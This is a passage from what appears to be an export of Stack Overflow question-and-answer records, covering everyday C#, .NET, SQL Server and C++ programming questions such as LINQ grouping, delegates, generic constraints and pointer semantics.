<pre><code>{ {""A"",""C#""} , {""A"",""Java""} , {""A"",""C++""},{""B"",""C#""},............ }
</code></pre>

<p>The null should be ignored.</p>
","33708","","<pre><code>Group.Where(x =&gt; x != null)
     .SelectMany(g =&gt; combination.Where(c =&gt; c != null)
                                 .Select(c =&gt; new {Group = g, Combination = c}));
</code></pre>

<p>Alternatively:</p>

<pre><code>from g in Group where g != null
from c in combination where c != null
select new { Group = g, Combination = c }
</code></pre>
"
"<p>In C#, is it possible to have an object that has multiple method signatures for an Action&lt;> or delegate? Like this: </p>

<pre><code>class Foo
{
    public Action&lt;string&gt; DoSomething;
    public Action&lt;string, string&gt; DoSomething;
}

class Bar
{
    public Bar()
    {
        Foo f1 = new Foo();
        f1.DoSomething = (s) =&gt; { Console.Write(s) };
        Foo f2 = new Foo();
        f2.DoSomething = (s1, s2) =&gt; { Console.Write(s1 + s2) };

        f1.DoSomething(""Hi"");
        f2.DoSomething(""Hi"",""World"");
    }
}
</code></pre>

<p>The answer seems to be no, so what is the proper way to implement something like that? (The actual problem this was trying to solve has been solved a different way, this is just curiosity at this point)</p>
","33708","","<p>A <code>delegate</code> is an abstraction of a <em>single method</em> (of course, several methods with similar signatures can be represented by a single delegate but from the caller's perspective, it behaves just like a single method, so that's irrelevant here.) It doesn't make sense for a single method to have multiple signatures. Hence, a delegate instance has a specific signature. Overload resolution does not have any meaning for delegates. It's not a method group you're choosing from. You're directly pointing to a method and saying ""call this.""</p>

<blockquote>
  <p>What's the solution to this problem?</p>
</blockquote>

<p>It's not clear to me what the actual problem is. This might be what you're looking for:</p>

<pre><code>class Foo {
    public Action&lt;string&gt; DoSomethingDelegate1;
    public Action&lt;string,string&gt; DoSomethingDelegate2;
    public void DoSomething(string s) { DoSomethingDelegate1(s); }
    public void DoSomething(string s, string t) { DoSomethingDelegate2(s, t); }
}

class Bar
{
    public Bar()
    {
        Foo f1 = new Foo();
        f1.DoSomethingDelegate1 = (s) =&gt; { Console.Write(s) };
        Foo f2 = new Foo();
        f2.DoSomethingDelegate2 = (s1, s2) =&gt; { Console.Write(s1 + s2) };

        f1.DoSomething(""Hi"");
        f2.DoSomething(""Hi"",""World"");
    }
}
</code></pre>
"
"<p>How does one effectively dispose a <code>StringBuilder</code> object? If an user generates multiple reports in a single sitting, my app ends up using a huge amount of memory.</p>

<p>I've read in a few sites online that the follow may help:</p>

<pre><code>StringBuilder sb = new StringBuilder(1000000);

// loop goes here adding lots of stuff to sb

exampleObject.Text = sb.ToString();

sb.Length = 0;
</code></pre>

<p>Does the last line really help? Any other way of dealing with this?</p>

<p>NB: This does not really stop my users from continuing to use the application. I'm just wondering if there is a way of avoiding redundant memory usage.</p>
","33708","","<p>No, a <code>StringBuilder</code> is a purely managed resource. You should just get rid of all references to it. Everything else is taken care of by the garbage collector:</p>

<pre><code>StringBuilder sb = ...;
// ... do work
sb = null; // or simply let it go out of scope.
</code></pre>

<p>In .NET, there's no deterministic <code>delete</code> (like C++, where you free up memory allocated to a single object.) Only GC can free memory. By forfeiting all references to an object, you'll let GC be able to deallocate the object if it wants to. You can force a garbage collection by calling the <code>System.GC.Collect</code> method. However, it's not recommended to manipulate with GC unless you really know what you are doing. GC is smart. It's rarely beneficial to force it.</p>
"
"<p>I have a concrete class that contains a collection of another concrete class. I would like to expose both classes via interfaces, but I am having trouble figuring out how I can expose the <strong>Collection&lt;ConcreteType&gt;</strong> member as a <strong>Collection&lt;Interface&gt;</strong> member.</p>

<p>I am currently using .NET 2.0</p>

<p>The code below results in a compiler error: </p>

<blockquote>
  <p>Cannot implicitly convert type
  'System.Collections.ObjectModel.Collection&lt;Nail&gt;' to
  'System.Collections.ObjectModel.Collection&lt;INail&gt;'</p>
</blockquote>

<p>The commented attempt to cast give this compiler error: </p>

<blockquote>
  <p>Cannot convert type
  'System.Collections.ObjectModel.Collection&lt;Nail&gt;' to<br>
  'System.Collections.ObjectModel.Collection&lt;INail&gt;' via a
  reference conversion, boxing conversion, unboxing conversion, wrapping
  conversion, or null type conversion.</p>
</blockquote>

<p>Is there any way to expose the collection of concrete types as a collection of interfaces or do I need to create a new collection in the getter method of the interface?</p>

<pre><code>using System.Collections.ObjectModel;

public interface IBucket
{
    Collection&lt;INail&gt; Nails
    {
        get;
    }
}

public interface INail
{
}

internal sealed class Nail : INail
{
}

internal sealed class Bucket : IBucket
{
    private Collection&lt;Nail&gt; nails;

    Collection&lt;INail&gt; IBucket.Nails
    {
        get
        {
            //return (nails as Collection&lt;INail&gt;);
            return nails;
        }
    }

    public Bucket()
    {
        this.nails = new Collection&lt;Nail&gt;();
    }
}
</code></pre>
","33708","","<p>C# 3.0 generics are invariant. You can't do that without creating a new object. C# 4.0 introduces safe covariance/contravariance which won't change anything about read/write collections (your case) anyway.</p>
"
"<p>Do you use singular or plural for enumerations? I think it makes best sense with plural in the declaration</p>

<pre><code>enum Weekdays
{
    Monday,
    Tuesday,
    Wednesday,
    Thursday,
    Friday,
    Saturday,
    Sunday
}
</code></pre>

<p>... but I think it makes more sense with singular when using the type, e.g.</p>

<pre><code>Weekday firstDayOfWeek = Weekday.Monday;
</code></pre>

<p>I read a recommendation somewhere to use singular whith regular enums and plural with flags, but I would like to hear some more pros and cons.</p>
","33708","","<p>In the .NET Framework, most ""normal"" enums (e.g. <code>DayOfWeek</code>) have singular names and flag enums (e.g. <code>StringSplitOptions</code>, <code>BindingFlags</code>) have plural names. It makes sense, since a value of a flag enum can represent multiple items but for a non-flag enum, it can only represent a single item.</p>
"
"<p>I have a simple C# 2008 application which displays a png-picture and handles some simple MouseEvents.</p>

<p>Although it's nothing complex, it uses at least 9.5-10 MB of memory (as shown in task-manager)</p>

<p>I've already disabled any type of error logging as well as I removed debug and trace symbols. ""Optimize Code"" is activated. </p>

<p>Is there any way to reduce this? Maybe with some options as native compiling of the framework (does this even exist for .NET?)</p>

<p>Any idea? Or is this just the price I have to pay for having the .NET-Framework?</p>

<p><strong>Edit</strong>: 10 MB is not much, i know. But it's going to run on a Citrix Presentation Server (or XenApp as it is called now) which means that there are ~30 users on one server. 30 users * 10 MB = 300 MB only for this little application.</p>

<p>Thanks in advance and best regards</p>
","33708","","<p>Whatever you do, the CLR will have to be loaded in the process. 10MB is not too much memory and not all of 10MB is private memory (probably most of it is sharable). By the way, it's not like ""if your simple app takes 10MB, making it as double as complex (memory-wise) will need twice the memory (basically, it's CLR's memory footprint.) </p>

<p>I just built a simple console application (<code>for(;;);</code>). ""Resource Monitor"" shows it takes ~2.5MB private memory and ~7MB sharable memory. </p>
"
"<p>Consider the requirement to <em>change</em> a data member on one or more properties of an object that is 5 or 6 levels deep. </p>

<p>There are sub-collections that need to be iterated through to get to the property that needs inspection &amp; modification.</p>

<p>Here we're calling a method that cleans the street address of a Employee. Since we're changing data within the loops, the current implementation needs a <code>for</code> loop to prevent the exception:</p>

<blockquote>
  <p>Cannot assign to ""someVariable"" because it is a 'foreach iteration variable'</p>
</blockquote>

<p>Here's the current algorithm (obfuscated) with nested <code>foreach</code> and a <code>for</code>.</p>

<pre><code>foreach (var emp in company.internalData.Emps)
{
    foreach (var addr in emp.privateData.Addresses)
    {
        int numberAddresses = addr.Items.Length;

        for (int i = 0; i &lt; numberAddresses; i++)
        {
            //transform this street address via a static method
            if (addr.Items[i].Type ==""StreetAddress"")
    	       addr.Items[i].Text = CleanStreetAddressLine(addr.Items[i].Text);
        }
    }
}
</code></pre>

<p><strong>Question:</strong>
Can this algorithm be reimplemented using LINQ? The requirement is for the original collection to have its data changed by that static method call.</p>

<p><strong>Update:</strong> I was thinking/leaning in the direction of a jQuery/selector type solution. I didn't specifically word this question in that way. I realize that I was over-reaching on that idea (no side-effects). Thanks to everyone! If there is such a way to perform a jQuery-like selector, please let's see it!</p>
","33708","","<pre><code>foreach(var item in company.internalData.Emps
                        .SelectMany(emp =&gt; emp.privateData.Addresses)
                        .SelectMany(addr =&gt; addr.Items)
                        .Where(addr =&gt; addr.Type == ""StreetAddress""))
     item.Text = CleanStreetAddressLine(item.Text);
</code></pre>
"
"<p>Is there any way to stop a running loop inside another method or insert a break statement dynamically in C#?</p>

<p>Thanks</p>

<p>Edit : I want to be able to dynamically intercept the method and insert a break to stop the loop when an event gets triggered in another function.I have several instances of the class and I want to stop the loop in each instance whenever required and manage all the instances. Consider multiple instances to be in a generic list</p>

<p>Example :  </p>

<pre><code>List&lt;myclass&gt; objlist=new List&lt;myclass&gt;();

foreach(myclass obj in objlist)
{
obj.loopingfunction().BreakLoop //or something like this (assuming that the loopingfunction is already called)
}
</code></pre>

<p>I need this because I want to break the loop once the user stores some huge amount of data.When the user imports the data,I get a event fired. But I cannot keep checking the database from multiple instances since it screws up sqlserver.</p>

<p>This is in an ASP.Net application.</p>
","33708","","<p>If the whole thing is running in a single thread, it wouldn't make any sense. If the loop is running, then nothing else is running at the same time. If you're running a loop on another thread and the controlling method on another thread, you can either abort the loop thread completely or check a flag inside the loop to decide whether or not you should break and set the flag appropriately in the controlling method.</p>

<p>Update: make that function return a boolean value indicating whether you should break and use it in an ""<code>if</code>"" statement:</p>

<pre><code>if (myFunctionShouldBreakLoop()) break;
</code></pre>
"
"<p>I'm trying to convert the below bit of code into VB (and obviously apply it to my own solution) that I took from <a href=""http://msdn.microsoft.com/en-us/library/hy3sefw3%28VS.80%29.aspx"" rel=""nofollow"">this MSDN article</a></p>

<pre><code>// The event. Note that by using the generic EventHandler&lt;T&gt; event type
// we do not need to declare a separate delegate type.
public event EventHandler&lt;ShapeEventArgs&gt; ShapeChanged;

//The event-invoking method that derived classes can override.
protected virtual void OnShapeChanged(ShapeEventArgs e)
{
    // Make a temporary copy of the event to avoid possibility of
    // a race condition if the last subscriber unsubscribes
    // immediately after the null check and before the event is raised.
    EventHandler&lt;ShapeEventArgs&gt; handler = ShapeChanged;
    if (handler != null)
    {
        handler(this, e);
    }
}
</code></pre>

<p>My conversion (applicable to my program) is as follows:</p>

<pre><code>Public Event StatusChanged As EventHandler(Of StatusChangedArgs)

Protected Overridable Sub OnStatusChanged(ByVal e As StatusChangedArgs)
   Dim handler As EventHandler(Of StatusChangedArgs) = StatusChanged 'error here'
   RaiseEvent handler(Me, e)
End Sub
</code></pre>

<p>But I'm getting an error: <code>Public Event StatusChanged(sender As Object, e As StatusChangedArgs) is an event and cannot be called directly. Use a ""RaiseEvent"" statement to raise an event.</code> If I'm converting it correctly, this doesn't make sense, since it's copied right out of MSDN, who I think would be correct, so obviously I'm doing something wrong. Anyone have any ideas?</p>

<p>Thanks...</p>
","33708","","<pre><code>RaiseEvent StatusChanged(Me, e)
</code></pre>

<p>nothing else is necessary. Null check is unncessarily in VB.NET. It's done by <code>RaiseEvent</code> internistically.</p>

<p><hr /></p>

<h3>Response to comment:</h3>

<p>In C#, you save the delegate in a local variable to prevent race conditions. If you call a null delegate in C#, you'll get a <code>NullReferenceException</code>. To prevent it, you check it to ensure it's not null. If you write it as:</p>

<pre><code>if (StatusChanged != null) { 
   // another thread might set `StatusChanged` to null at this point
   // causing the next line to fail.
   StatusChanged(this, e);
}
</code></pre>

<p>However, since VB does all this stuff in <code>RaiseEvent</code>, it's not necessary to check for nulls and consequently, it's not necessary to make a local copy of the delegate.</p>
"
"<p>I've got a client app which has to connect to a server and register for waiting, that is, it wants to be notified when the server is done with some processing. Ideally, I want to keep this client as simple as possible, but the question is, how to ""register for waiting"". I could keep the socket open and do a blocking read, and as soon as the server is done, it'll send some data to the client and I'm done; unfortunately this blocks one port on the server for quite some time.</p>

<p>What alternatives are there? I could pick a random port on the client side, and listen for a connection there, but this requires me to pick a free random port -- and I'm not sure how to do this best in C#? I thought about checking the local port used while sending to the server, and re-using this; I wonder if there is some recommended way to solve this. Polling from the client is out of question, as the time between finish and notification shouldn't be too long.</p>
","33708","","<p>Pass <code>0</code> as the port number to the <a href=""http://msdn.microsoft.com/en-us/library/system.net.ipendpoint.aspx"" rel=""nofollow""><code>IPEndPoint</code></a> constructor: </p>

<blockquote>
  <h3><a href=""http://msdn.microsoft.com/en-us/library/system.net.sockets.socket.bind.aspx"" rel=""nofollow"">Socket.Bind</a> Remarks on MSDN:</h3>
  
  <p>If you do not care which local port is used, you can create an <code>IPEndPoint</code> using 0 for the port number. In this case, the service provider will assign an available port number between 1024 and 5000.</p>
  
  <p>If you use the above approach, you can discover what local network address and port number has been assigned by calling the <code>LocalEndPoint</code>. If you are using a connection-oriented protocol, <code>LocalEndPoint</code> will not return the locally assigned network address until after you have made a call to the <code>Connect</code> or <code>EndConnect</code> method. If you are using a connectionless protocol, you will not have access to this information until you have completed a send or receive.</p>
</blockquote>
"
"<p>I'm using sql server 2008 and have started to find using Indexed Views are helping me speed up some of my queries ... as my schema isn't basic.</p>

<p>So, if i have a table that is the following...</p>

<pre><code>**ParentTable
ParentId INT PK IDENTITY
Name VARCHAR(MAX)

**ChildTable
ChildId INT PK IDENTITY
ParentId INT (FK to the table above)
Name VARCHAR(MAX)
Boundary GEOGRAPHY
CentrePoint GEOGRAPHY
CentrePointFlattened GEOMETRY
</code></pre>

<p>So for each row in the parent table, it can have zero to many children.</p>

<p>Firstly, if I make an index'd view of the children, it won't work if the ParentId filed can be nullable. So i need to make it required.</p>

<p>Now the question.</p>

<p>I have an index view of the children table inner join'd to the parent table (note i'm only indexing some of the fields from either table)...</p>

<pre><code>(pseduo sql code)
ParentId INT
Name VARCHAR(MAX) AS ParentName
ChildId INT
Name VARCHAR(MAX) as ChildName
Boundary GEOGRAPHY
</code></pre>

<p>Now, are the data for these 5 fields serialized/copied to ANOTHER location <em>again</em> ? or does the index view only create some index id's that is the data for the table?</p>
","33708","","<p>Yes. Indexed view is basically another <em>invisible</em> table that gets updated automatically as underlying tables change.</p>
"
"<p>The question is : </p>

<blockquote>
  <p>How to generate a list of all possible 3-chars strings in C#?</p>
</blockquote>

<p>To clairify, that's within the domain of 64<sub>10</sub> and 90<sub>10</sub></p>
","33708","","<pre><code>IEnumerable&lt;string&gt; GetAllStrings(params char[] inputCharacterSet) {
    return from n in inputCharacterSet
           from m in inputCharacterSet
           from k in inputCharacterSet
           select new string(new [] { n, m, k });
}
</code></pre>
"
"<p>So in a previous question I asked about implementing a generic interface with a public class and bingo, it works. However, one of the types I'm looking to pass in is one of the built in nullable types such as: int, Guid, String, etc.</p>

<p>Here's my Interface:</p>

<pre><code>public interface IOurTemplate&lt;T, U&gt;
    where T : class
    where U : class
{
    IEnumerable&lt;T&gt; List();
    T Get(U id);
}
</code></pre>

<p>So when I implement this like so:</p>

<pre><code>public class TestInterface : IOurTemplate&lt;MyCustomClass, Int32&gt;
{
    public IEnumerable&lt;MyCustomClass&gt; List()
    {
        throw new NotImplementedException();
    }

    public MyCustomClass Get(Int32 testID)
    {
        throw new NotImplementedException();
    }
}
</code></pre>

<p>I receive the error message: <em>The type 'int' must be a reference type in order to use it as parameter 'U' in the generic type or method 'TestApp.IOurTemplate'</em></p>

<p>I've tried to infer the type Int32?, but same error. Any ideas?</p>
","33708","","<p>Nullable types don't satisfy <code>class</code> or <code>struct</code> constraints:</p>

<blockquote>
  <h3>C# Language Specification v3.0 (Section Â§10.1.5: Type parameter constraints):</h3>
  
  <p>The reference type constraint specifies that a type argument used for the type parameter must be a reference type. All class types, interface types, delegate types, array types, and type parameters known to be a reference type (as defined below) satisfy this constraint.
  The value type constraint specifies that a type argument used for the type parameter must be a non-nullable value type. </p>
  
  <p>All non-nullable struct types, enum types, and type parameters having the value type constraint satisfy this constraint. <strong>Note that although classified as a value type, a nullable type (Â§4.1.10) does not satisfy the value type constraint.</strong> A type parameter having the value type constraint cannot also have the constructor-constraint.</p>
</blockquote>
"
"<p>I have a byte array of a file and I need to save it into my database in a field that has been set aside of type image.</p>

<p>However I have a problem my data access class takes a sql string and commits it to the database for example.</p>

<p>""EXECUTE stored proc @parm1, @parm2, @parm3""</p>

<p>However the problem is I cannot figure out how to transfer the byte array to string so that I can add it as an argument.</p>

<p>I hope this make sense.</p>

<p>I also understand that I can build parameters in com objects but I do not want to do this as it will disrupt my whole data access class and I am not prepared to do this at the moment.</p>

<p>Thanks for any help.</p>
","33708","","<p>In SQL statements, you can use the hexadecimal notation ""0x1323235..."" to represent binary data but it's not really a good way to deal with it. You should be using parameters:</p>

<pre><code>sqlCmd.Parameters.AddWithValue(""@parameterName"", byteArrayInstance)
</code></pre>
"
"<p>You can convert a negative number to positive like this:</p>

<pre><code>int myInt = System.Math.Abs(-5);
</code></pre>

<p>Is there an equivalent method to make a positive number negative?</p>

<p>Thanks</p>
","33708","","<p>Note to everyone who responded with </p>

<pre><code>- Math.Abs(myInteger)
</code></pre>

<p>or </p>

<pre><code>0 - Math.Abs(myInteger)
</code></pre>

<p>or</p>

<pre><code>Math.Abs(myInteger) * -1
</code></pre>

<p>as a way to keep negative numbers negative and turn positive ones negative.</p>

<p>This approach has a single flaw. It doesn't work for all integers. The range of <code>Int32</code> type is from ""-2<sup>31</sup>"" to ""2<sup>31</sup> - 1."" It means there's one more ""negative"" number. Consequently, <code>Math.Abs(int.MinValue)</code> throws an <code>OverflowException</code>. </p>

<p>The correct way is to use conditional statements:</p>

<pre><code>int neg = n &lt; 0 ? n : -n;
</code></pre>

<p>This approach works for ""all"" integers.</p>
"
"<p>I've read the topic about passing an object[] to a params object[] but I don't know why it's not working with me.</p>

<p>I have these too functions in a class:</p>

<pre><code>...
    private void CallbackEvent(object source, CallbackEvetArgs e) { // Some event with e.Data as string
    ...
        string[] values = e.Data.Split('|');
        DoSave(""save"", values.Skip(1).Cast&lt;object&gt;().ToArray());
    ...
    }
...
    public void DoSave(string action, params object[] values) {
    ...
        string value1 = values[0];
    ...
    }
...
</code></pre>

<p>but instead of receiving an string in value1, value1 is receiving the whole array (string[]) and therefore an invalid casting exception.</p>

<p>What am I doing wrong?</p>
","33708","","<p>C# (.NET in general) arrays are covariant. You can simply pass the <code>string[]</code> to an <code>object[]</code> parameter.</p>

<pre><code>DoSave(""save"", values.Skip(1).ToArray());
</code></pre>

<p>The code you posted is definitely not the exact code you tested. <code>Cast&lt;object&gt;</code> should also work correctly. This line shouldn't compile:</p>

<pre><code>string value1 = values[0]; // object -&gt; string, no implicit conversion.
</code></pre>

<p>Please post the <strong>exact</strong> code causing the problem.</p>
"
"<p>I can't remember exactly where I've seen this strange <code>`1</code> (single-tick and the number 1) appearing next to classnames, but it's shown up when inspecting variable values while debugging and most recently in the answer to <a href=""http://stackoverflow.com/questions/1348268/how-do-i-create-a-class-that-inherits-from-another-and-passes-a-type-parameter-in"">this question</a>.</p>

<pre><code>targetClass.BaseTypes.Add(new CodeTypeReference { BaseType = ""DataObjectBase`1[Refund]"", Options = CodeTypeReferenceOptions.GenericTypeParameter })
</code></pre>

<p>I'm curious: where does this come from and why is it there?</p>
","33708","","<p>It's a generic type with 1 type parameter.</p>

<p>For example, <code>List&lt;T&gt;</code> is </p>

<pre><code>System.Collections.Generic.List`1
</code></pre>

<p>and <code>Dictionary&lt;TKey, TValue&gt;</code> is</p>

<pre><code>System.Collections.Generic.Dictionary`2
</code></pre>

<p>This allows generic types to be overloaded by the number of type parameters.</p>
"
"<p><a href=""http://dotnetaddict.dotnetdevelopersjournal.com/win7%5Fvhd.htm"" rel=""nofollow"">Kevin Hoffman</a> this morning reports that:</p>

<blockquote>
  <p>When put under a virtual machine
  running Windows 7, VS2010 fails to
  render things, borders disappear,
  windows become unusable and the
  experience is downright awful. On the
  other hand, when you run VS2010 ""bare
  metal"" with no virtualization between
  it and your video card, everything is
  beautiful and all works well.</p>
</blockquote>

<p>What about a virtual machine would cause VS2010's WPF to render poorly?</p>
","33708","","<p>WPF renders stuff on a Direct3D surface. It's able to take advantage of hardware acceleration features provided by graphics cards to improve performance. Under VMs, these features might be unavailable.</p>
"
"<p>I have an <code>IEnumerable&lt;string</code>> which I would like to split into groups of three so if my input had 6 items i would get a <code>IEnumerable&lt;IEnumerable&lt;string&gt;&gt;</code> returned with two items each of which would contain an <code>IEnumerable&lt;string&gt;</code> which my string contents in it.</p>

<p>I am looking for how to do this with Linq rather than a simple for loop</p>

<p>Thanks</p>
","33708","","<pre><code>var result = sequence.Select((s, i) =&gt; new { Value = s, Index = i })
                     .GroupBy(item =&gt; item.Index / 3, item =&gt; item.Value);
</code></pre>

<p>Note that this will return an <code>IEnumerable&lt;IGrouping&lt;int,string&gt;&gt;</code> which will be functionally similar to what you want. However, if you strictly need to type it as <code>IEnumerable&lt;IEnumerable&lt;string&gt;&gt;</code> (to pass to a method that expects it in C# 3.0 which doesn't support generics variance,) you should use <a href=""http://msdn.microsoft.com/en-us/library/bb341406.aspx""><code>Enumerable.Cast</code></a>:</p>

<pre><code>var result = sequence.Select((s, i) =&gt; new { Value = s, Index = i })
                     .GroupBy(item =&gt; item.Index / 3, item =&gt; item.Value)
                     .Cast&lt;IEnumerable&lt;string&gt;&gt;();
</code></pre>
"
"<p>Please, excuse my ignorance about this subject :)</p>

<p>C++0x is introducing <code>unordered_set</code> which is available in <code>boost</code> and many other places. What I understand is that <code>unordered_set</code> is hash table with <code>O(1)</code> lookup complexity. On the other hand, <code>set</code> is nothing but a tree with <code>log(n)</code> lookup complexity. <strong>Why on earth would anyone use <code>set</code> instead of <code>unordered_set</code>? i.e is there a need for <code>set</code> anymore?</strong></p>
","33708","","<p>Whenever you prefer a tree to a hash table. </p>

<p>For instance, hash tables are ""O(n)"" at worst case. O(1) is the average case. Trees are ""O(<em>log</em> n)"" at worst. </p>
"
"<p>I have base class <code>BaseClass</code> and derived classes <code>DerivedA</code>, <code>DerivedB</code>, and <code>DerivedC</code> that all inherit <code>BaseClass</code>.</p>

<p>I have another class, <code>ExternalClass</code> with a method that accepts a parameter of type <code>BaseClass</code>, but is actually passed a derived class. What is the best way to differentiate between these classes in <code>ExternalClass</code> if I wanted to perform a different action based on which derived class it received?</p>

<p>I was thinking of doing a <code>Select</code> but I'm not exactly sure how.</p>

<p>Thanks</p>
","33708","","<p>Your design is very likely to be flawed. You should consider making the behavior a method of <code>BaseClass</code> and override it in each derived class. You shouldn't check for the actual type of the object.</p>

<p>That is, <code>ExternalClass</code> should just call a method declared in <code>BaseClass</code> regardless of the actual type. Since the method is overriden by derived classes, the appropriate implementation will be called. </p>

<p>That said, to check if an object is an instance of a type or its derived classes, you can use the <code>is</code> operator:</p>

<pre><code>if (obj is DerivedA) // C#
If TypeOf obj Is DerivedA Then ' // VB
</code></pre>

<p>If you want to check if the object is an instance of a specific type (and not its derived types):</p>

<pre><code>if (obj.GetType() == typeof(DerivedA)) // C#
If obj.GetType() Is GetType(DerivedA) Then ' // VB
</code></pre>
"
"<p>It is quite possible that I may not have got the point, but I really can't figure out how ASP.NET MVC's HTML Helpers can help me. Here's a sample: -</p>

<p>HTML:</p>

<pre><code>&lt;a href=""ActionName"" target=""_blank""&gt;Click Me&lt;/a&gt;
</code></pre>

<p>HTML Helper:</p>

<pre><code>&lt;%= Html.ActionLink(""Click me"", ""ActionName"", null, new {target=""blank""}) %&gt;
</code></pre>

<p>My eyes are reading HTML more easily, and it seems counter-intuitive to use the HTML Helpers. </p>

<p>Look at the following arguments:</p>

<ul>
<li>A lot of people (even novices) know how to read HTML. The HTML Helper syntax can confuse easily.</li>
<li>In many cases you need to do more typing writing an HTML 'helper', then you need to write the actual HTML.</li>
<li>The HTML Helper is going to spew real HTML anyway, so why not write HTML directly?</li>
<li>Writing HTML gives you more control over the syntax, and the standards. You can make it conform to whatever HTML standard you want.</li>
</ul>

<p>Are there any special compelling reasons that I have not understood (since I am self-educated in MVC and there could be gaps) that should make me want to prefer HTML Helpers?</p>

<p>Or are they just code noise?</p>
","33708","","<p>The primary reason you don't use <code>&lt;a&gt;</code> tags directly is that you don't want to hardcode URLs in your application. The <code>Html.ActionLink</code> method will abstract away the URL generation and you'll specify the controller, action, and other parameters.</p>

<p>So, basically, the two lines you posted in your question are not really equivalent. You should consider adding the dynamic URL generation code to the <code>&lt;a&gt;</code> tag to make them functionally equivalent. Beside that, if you output HTML directly, you'll have to be extremely careful about HTML encoding stuff. <code>Html.ActionLink</code> will do this job for you too.</p>
"
"<p>Lets say, i have </p>

<pre><code>int *p;
p = new int[5];
for(int i=0;i&lt;5;i++)
   *(p+i)=i;
</code></pre>

<p>Now I want to add a 6th element to the array. How do I do it?</p>
","33708","","<p>If you allocate the initial buffer using <code>malloc</code> you can use <code>realloc</code> to resize the buffer. You shouldn't use <code>realloc</code> to resize a <code>new</code>-ed buffer.</p>

<pre><code>int * array = (int*)malloc(sizeof(int) * arrayLength);
array = (int*)realloc(array, sizeof(int) * newLength);
</code></pre>

<p>However, this is a C-ish way to do things. You should consider using <code>vector</code>.</p>
"
"<p>The ServerValidate event of CustomValidator has 2 parameters: source and args.</p>

<p>What each of them point out to?  Any description of them please.</p>

<p>Thank you</p>
","33708","","<p>Like all ""<code>EventHandler</code>""-style events, <code>source</code> will refer to the object that raised the event (in this case the <code>CustomValidator</code> instance) and <code>args</code> will refer to event data associated to this specific event. </p>

<p>For <a href=""http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.customvalidator.servervalidate.aspx""><code>ServerValidate</code> event</a>, the <code>args</code> parameter is of type <a href=""http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.servervalidateeventargs.aspx""><code>ServerValidateEventArgs</code></a>. It has two important properties:</p>

<ul>
<li><a href=""http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.servervalidateeventargs.value.aspx""><code>Value</code></a>: returns the value of the input control you're validating (e.g. text in the textbox.)</li>
<li><a href=""http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.servervalidateeventargs.isvalid.aspx""><code>IsValid</code></a>: you set this property to <code>true</code> if the validation is successful and <code>false</code> if it's not.</li>
</ul>
"
"<p>Say that you're writing a library to display things on the screen, so you create an <code>IDisplayable</code> interface. This interface has one method to create a control from the object: <code>displayable.GetControl()</code>.</p>

<p>You want to create your own list type that can be displayed: <code>MyList&lt;T&gt;</code>. Now this list can only be displayed if <code>T</code> is an <code>IDisplayable</code>, so you could ask in the MyList class that T should implement IDisplayable. But you also want to use this list type in some places when T is not IDisplayable (and as a result this list will not be displayable). So is it possible to say that MyList implements IDisplayable if T implements IDisplayable? I would also be happy if <code>MyList&lt;T&gt;</code> always implements IDisplayable but throws an exception at runtime if you try to call <code>GetControl()</code> if T is not IDisplayable, but I'd like to know if there's a statically type-safe way to do it. Can this be done? Or am I looking at the wrong solution?</p>

<p>Edit:</p>

<p>I agree with the suggestions so far that MyList may have too many responsibilities. My original idea was to create a <code>MyDisplayableList&lt;T&gt; : MyList&lt;T&gt; (where T : IDisplayable)</code>.</p>

<p>The problem with this approach is that I have a lot of methods that take a MyList and return a MyList (for example methods like Select in Linq). So if I use select on an MyDisplayableList I get back a MyList and them I'm unable to display it even though it is a MyList...is there a type safe way to handle this problem in C#?</p>
","33708","","<p>Simple. Check if the type is <code>IDisplayable</code>. If it's not, throw an <code>InvalidOperationException</code>:</p>

<pre><code>if (!typeof(IDisplayable).IsAssignableFrom(typeof(T))) 
    throw new InvalidOperationException();
</code></pre>

<p>Or if you have an instance of <code>T</code>, simply check with that:</p>

<pre><code>IDisplayable disp = instanceOfT as IDisplayable;
if (disp == null)
    throw new InvalidOperationException();
// do stuff with `disp`.
</code></pre>

<p>Your design might be flawed though. You might be putting too much in a class and violating single responsibility principle. Recheck your design first.</p>
"
"<p>I am new to programming.
Using C# &amp; ASP.Net, how would I differentiate between a property &amp; a method?
How can I tell if something is a property or a method?</p>
","33708","","<p>Visual Studio displays different icons in the IntelliSense list. It's mentioned in the documentation too:</p>

<p><img src=""http://img1.myimg.de/intellisense88c76.png"" alt=""Visual Studio IntelliSense list"" /></p>

<p>You don't use parenthesis to access properties but you always do when you're calling methods.</p>
"
"<p>How can I make a script that makes one thing happen 4/5 times and the other thing 1/5 times</p>

<p>I need it to appear after this</p>

<pre><code>private void Arrest()
{
    Ped Criminal = Player.GetTargetedPed();
    if (Exists(Criminal) &amp;&amp; 
        (Player.Character.Position.DistanceTo(Criminal.Position) &lt;= 10.0F))
    {
</code></pre>
","33708","","<pre><code>static Random rnd = new Random();
static void DoOne() { ... }
static void DoTwo() { ... }
static void RollDice() {
   if (rnd.Next(5) == 0)
       DoOne(); // happens 1/5 times
   else
       DoTwo(); // happens 4/5 times
}
</code></pre>

<p>It is important <strong>you don't recreate <code>Random</code> instance on each call</strong>. You should keep the old instance around and reuse it. Otherwise, the randomly generated sequence will not be uniformly distributed.</p>
"
"<p>I would like to know <strong>architectures which violate the assumptions</strong> I've listed below.  Also, I would like to know if any of the assumptions are false for all architectures (that is, if any of them are just completely wrong).</p>

<ol>
<li><p>sizeof(int *) == sizeof(char *) == sizeof(void *) == sizeof(func_ptr *)</p></li>
<li><p>The in-memory representation of all pointers for a given architecture is the same regardless of the data type pointed to.</p></li>
<li><p>The in-memory representation of a pointer is the same as an integer of the same bit length as the architecture.</p></li>
<li><p>Multiplication and division of pointer data types are only forbidden by the compiler.  NOTE: Yes, I know this is nonsensical. What I mean is - is there hardware support to forbid this incorrect usage?</p></li>
<li><p>All pointer values can be casted to a single integer. In other words, what architectures still make use of segments and offsets?</p></li>
<li><p>Incrementing a pointer is equivalent to adding <code>sizeof(the pointed data type)</code> to the memory address stored by the pointer. If <code>p</code> is an <code>int32*</code> then <code>p+1</code> is equal to the memory address 4 bytes after <code>p</code>.</p></li>
</ol>

<p>I'm most used to pointers being used in a contiguous, virtual memory space. For that usage, I can generally get by thinking of them as addresses on a number line. See Stack Overflow question <em><a href=""http://stackoverflow.com/questions/1350471/pointer-comparison/1350488#1350488"">Pointer comparison</a></em>.</p>
